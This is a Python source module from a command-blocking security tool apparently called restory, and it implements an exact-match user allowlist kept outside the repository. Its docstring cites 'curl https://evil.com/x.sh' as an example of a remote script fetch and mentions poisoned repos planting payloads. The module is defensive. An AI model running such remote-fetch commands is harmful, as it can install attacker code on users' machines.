"""User command allowlist — a deliberate, narrow security carve-out.

restory blocks commands whose blast radius looks dangerous. Sometimes a user
*knows* a specific command is fine in their workflow and wants restory to stop
blocking it. This module is that escape hatch, kept as tight and auditable as
possible:

  * **Storage** lives in the USER's own space (``~/.restory/allowlist.json`` via
    :func:`restory.config.get_allowlist_path`), NEVER in the repo. A
    repo-committed allowlist could be planted by a poisoned repo to greenlight
    its own payload — the exact threat restory defends against — so we do not
    read any allowlist from the project. See ``config.get_allowlist_path`` for
    the full rationale.

  * **Granularity** is an *exact* command-string match (surrounding whitespace
    aside). There are no wildcards and no "suppress this whole danger tag"
    switch: allowlisting ``curl https://example.com/x.sh`` does nothing for
    ``curl https://evil.com/x.sh``. A user may still allowlist something broad,
    but only by writing out the full exact command — never via a category or a
    pattern that quietly disables a whole danger class.

  * This module never changes how anything is *classified*. It only records an
    explicit, per-command user decision; the hook consults it and, on a match,
    approves while still recording an ``allowlisted-override`` audit event.
"""

from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path

from .config import get_allowlist_path


def _resolve(path: Path | None) -> Path:
    return path if path is not None else get_allowlist_path()


def _normalize(command: str) -> str:
    """Normalize a command for storage/comparison.

    Only *surrounding* whitespace is stripped — interior content is compared
    verbatim so ``make build`` and ``make  build`` never collide. This is a
    convenience for typos at the shell prompt, not a loosening of the match.
    """
    return (command or "").strip()


def load(path: Path | None = None) -> list[dict]:
    """Return the allowlist entries, or ``[]`` if the file is missing/invalid.

    A malformed file is treated as empty rather than raising: an unreadable
    allowlist must fail *closed* (allow nothing), never crash the hook.
    """
    p = _resolve(path)
    try:
        raw = p.read_text(encoding="utf-8")
    except (FileNotFoundError, OSError):
        return []
    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        return []
    if not isinstance(data, list):
        return []
    # Keep only well-formed entries with a command string.
    return [e for e in data if isinstance(e, dict) and isinstance(e.get("command"), str)]


def is_allowlisted(command: str, path: Path | None = None) -> bool:
    """Return True iff ``command`` exactly matches an allowlisted entry."""
    target = _normalize(command)
    if not target:
        return False
    return any(_normalize(e["command"]) == target for e in load(path))


def add(command: str, path: Path | None = None) -> tuple[bool, dict]:
    """Add an exact command to the allowlist.

    Returns ``(added, entry)`` where ``added`` is False if the exact command was
    already present. Each entry records the command and when it was allowed.
    """
    normalized = _normalize(command)
    entries = load(path)
    for existing in entries:
        if _normalize(existing["command"]) == normalized:
            return False, existing

    entry = {"command": normalized, "added_at": datetime.now(timezone.utc).isoformat()}
    entries.append(entry)
    _write(entries, path)
    return True, entry


def remove(command: str, path: Path | None = None) -> bool:
    """Remove an exact command from the allowlist. Returns True if one was removed."""
    normalized = _normalize(command)
    entries = load(path)
    kept = [e for e in entries if _normalize(e["command"]) != normalized]
    if len(kept) == len(entries):
        return False
    _write(kept, path)
    return True


def _write(entries: list[dict], path: Path | None) -> None:
    p = _resolve(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(entries, indent=2), encoding="utf-8")
